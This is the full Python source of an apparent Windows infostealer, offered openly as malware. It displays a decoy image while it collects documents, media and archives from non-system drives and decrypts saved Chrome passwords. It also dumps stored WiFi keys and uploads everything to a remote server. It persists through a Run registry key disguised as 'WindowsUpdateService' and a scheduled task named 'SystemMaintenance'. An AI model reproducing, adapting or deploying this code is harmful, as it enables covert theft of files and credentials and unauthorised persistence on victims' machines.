import subprocess
import requests
import threading
import winreg
import sys
import zipfile
import io
import time
import platform
from dotenv import load_dotenv
import threading
import ctypes
import os
from PIL import Image
load_dotenv()
if platform.system() != "Windows":
    sys.exit(0)
class FileHarvester:
    def __init__(self, server_url):
        self.server_url = server_url
        self.excluded_drives = ['C:\\']
        self.file_types = ['.txt', '.doc', '.docx', '.pdf', '.xls', '.xlsx',
                          '.jpg', '.png', '.jpeg', '.mp3', '.mp4', '.zip',
                          '.rar', '.7z', '.exe', '.dll', '.config', '.ini']
        self.max_file_size = 100 * 1024 * 1024
        self.collected_files = []
    def get_all_drives(self):
        drives = []
        try:
            bitmask = ctypes.windll.kernel32.GetLogicalDrives()
            for letter in range(ord('A'), ord('Z') + 1):
                drive_letter = f"{chr(letter)}:\\"
                if bitmask & (1 << (letter - ord('A'))):
                    if drive_letter not in self.excluded_drives:
                        drives.append(drive_letter)
        except:
            for letter in range(ord('A'), ord('Z') + 1):
                drive_letter = f"{chr(letter)}:\\"
                try:
                    subprocess.run(
                        ['dir', drive_letter],
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL,
                        creationflags=subprocess.CREATE_NO_WINDOW
                    )
                    if drive_letter not in self.excluded_drives:
                        drives.append(drive_letter)
                except:
                    pass
        return drives
    def collect_files(self, path):
        try:
            result = subprocess.check_output(['dir', path, '/b', '/a-d'], 
                                           creationflags=subprocess.CREATE_NO_WINDOW)
            files = result.decode('utf-8', errors='ignore').strip().split('\n')
            for file in files:
                if file.strip():
                    file_path = f"{path}\\{file.strip()}"
                    if any(file_path.lower().endswith(ext.lower()) for ext in self.file_types):
                        try:
                            size_result = subprocess.check_output(['dir', file_path], 
                                                                creationflags=subprocess.CREATE_NO_WINDOW)
                            lines = size_result.decode('utf-8', errors='ignore').split('\n')
                            if lines:
                                last_line = lines[-2] if len(lines) > 1 else lines[0]
                                parts = last_line.split()
                                for i, part in enumerate(parts):
                                    if part.lower().endswith('bytes'):
                                        size_str = parts[i-1].replace(',', '')
                                        try:
                                            size = int(size_str)
                                            if size <= self.max_file_size:
                                                self.collected_files.append(file_path)
                                        except:
                                            pass
                                        break
                        except:
                            pass
            result = subprocess.check_output(['dir', path, '/b', '/ad'], 
                                           creationflags=subprocess.CREATE_NO_WINDOW)
            dirs = result.decode('utf-8', errors='ignore').strip().split('\n')
            for dir_name in dirs:
                if dir_name.strip():
                    sub_path = f"{path}\\{dir_name.strip()}"
                    self.collect_files(sub_path)
        except Exception as e:
            pass
    def read_file(self, file_path):
        try:
            result = subprocess.check_output(['type', file_path], 
                                           creationflags=subprocess.CREATE_NO_WINDOW,
                                           shell=True)
            return result
        except:
            try:
                result = subprocess.check_output(['more', file_path], 
                                               creationflags=subprocess.CREATE_NO_WINDOW)
                return result
            except:
                return None
    def get_hostname(self):
        try:
            result = subprocess.check_output(['hostname'], 
                                           creationflags=subprocess.CREATE_NO_WINDOW)
            return result.decode('utf-8', errors='ignore').strip()
        except:
            return "UNKNOWN"
    def get_username(self):
        try:
            result = subprocess.check_output(['whoami'], 
                                           creationflags=subprocess.CREATE_NO_WINDOW)
            return result.decode('utf-8', errors='ignore').strip().split('\\')[-1]
        except:
            return "UNKNOWN"
    def compress_and_send(self):
        if not self.collected_files:
            return
        zip_buffer = io.BytesIO()
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
            for file_path in self.collected_files[:100]:
                content = self.read_file(file_path)
                if content:
                    try:
                        zip_file.writestr(file_path, content)
                    except:
                        continue
        zip_buffer.seek(0)
        try:
            files = {'files': ('stolen_files.zip', zip_buffer, 'application/zip')}
            data = {
                'hostname': self.get_hostname(),
                'user': self.get_username(),
                'timestamp': time.time()
            }
            response = requests.post(f"{self.server_url}/upload", 
                                   files=files, 
                                   data=data,
                                   timeout=30)
            if response.status_code == 200:
                print(f"[+] Successfully sent {len(self.collected_files)} files to server 😈")
            else:
                print(f"[-] Failed to send files: {response.status_code}")
        except Exception as e:
            print(f"[-] Connection error: {e}")
    def steal_browser_passwords(self):
        stolen_data = []
        try:
            import sqlite3
            import win32crypt
            chrome_path_cmd = subprocess.check_output(['echo', '%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data'],
                                                     creationflags=subprocess.CREATE_NO_WINDOW,
                                                     shell=True)
            chrome_path = chrome_path_cmd.decode('utf-8', errors='ignore').strip()
            if chrome_path:
                temp_db = "temp_chrome.db"
                subprocess.run(['xcopy', chrome_path, temp_db, '/Y'],
                             stdout=subprocess.DEVNULL,
                             stderr=subprocess.DEVNULL,
                             creationflags=subprocess.CREATE_NO_WINDOW)
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                for row in cursor.fetchall():
                    url = row[0]
                    username = row[1]
                    encrypted_password = row[2]
                    try:
                        decrypted_password = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1]
                        if decrypted_password:
                            stolen_data.append({
                                'url': url,
                                'username': username,
                                'password': decrypted_password.decode('utf-8')
                            })
                    except:
                        pass
                conn.close()
                subprocess.run(['del', temp_db, '/f'],
                             stdout=subprocess.DEVNULL,
                             stderr=subprocess.DEVNULL,
                             creationflags=subprocess.CREATE_NO_WINDOW)
        except:
            pass
        return stolen_data
    def steal_wifi_passwords(self):
        wifi_passwords = []
        try:
            profiles = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'],
                                             creationflags=subprocess.CREATE_NO_WINDOW).decode('utf-8', errors='ignore')
            profile_names = [line.split(":")[1].strip() for line in profiles.split('\n') if "All User Profile" in line]
            for profile in profile_names:
                try:
                    results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'],
                                                     creationflags=subprocess.CREATE_NO_WINDOW).decode('utf-8', errors='ignore')
                    password_lines = [line.split(":")[1].strip() for line in results.split('\n') if "Key Content" in line]
                    if password_lines:
                        wifi_passwords.append({
                            'ssid': profile,
                            'password': password_lines[0]
                        })
                except:
                    continue
        except:
            pass
        return wifi_passwords
    def run(self):
        print("[+] Starting file harvesting operation...")
        drives = self.get_all_drives()
        print(f"[+] Found {len(drives)} non-system drives")
        for drive in drives:
            print(f"[+] Scanning {drive}")
            self.collect_files(drive)
        print(f"[+] Collected {len(self.collected_files)} files")
        print("[+] Stealing browser passwords...")
        browser_data = self.steal_browser_passwords()
        print("[+] Stealing WiFi passwords...")
        wifi_data = self.steal_wifi_passwords()
        print("[+] Sending data to server...")
        self.compress_and_send()
        if browser_data or wifi_data:
            try:
                credentials = {
                    'browser_passwords': browser_data,
                    'wifi_passwords': wifi_data,
                    'hostname': self.get_hostname(),
                    'user': self.get_username()
                }
                requests.post(f"{self.server_url}/credentials",
                                       json=credentials,
                                       timeout=30)
                print(f"[+] Sent {len(browser_data)} browser passwords and {len(wifi_data)} WiFi passwords 😈")
            except:
                print("[-] Failed to send credentials")
        print("[+] Operation complete. Privacy is for pussies! 💀")
def persist_in_startup():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                           r"Software\Microsoft\Windows\CurrentVersion\Run",
                           0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "WindowsUpdateService", 0, winreg.REG_SZ, sys.argv[0])
        winreg.CloseKey(key)
        print("[+] Added to startup registry 😈")
    except:
        print("[-] Failed to add to startup")
def resource_path(relative_path):
    try:
        base_path = sys._MEIPASS
    except AttributeError:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)
def open_image(relative_path):
    image_path = resource_path(relative_path)
    Image.open(image_path).show()
if __name__ == "__main__":
    threading.Thread(
        target=open_image,
        args=("picture.jpg",)
    ,daemon=True).start()
    SERVER_URL = os.getenv('SERVER')
    persist_in_startup()
    harvester = FileHarvester(SERVER_URL)
    harvester.run()
    try:
        subprocess.run(['schtasks', '/create', '/tn', 'SystemMaintenance',
                       '/tr', sys.argv[0], '/sc', 'daily', '/st', '00:00'],
                     stdout=subprocess.DEVNULL,
                     stderr=subprocess.DEVNULL,
                     creationflags=subprocess.CREATE_NO_WINDOW)
    except:
        pass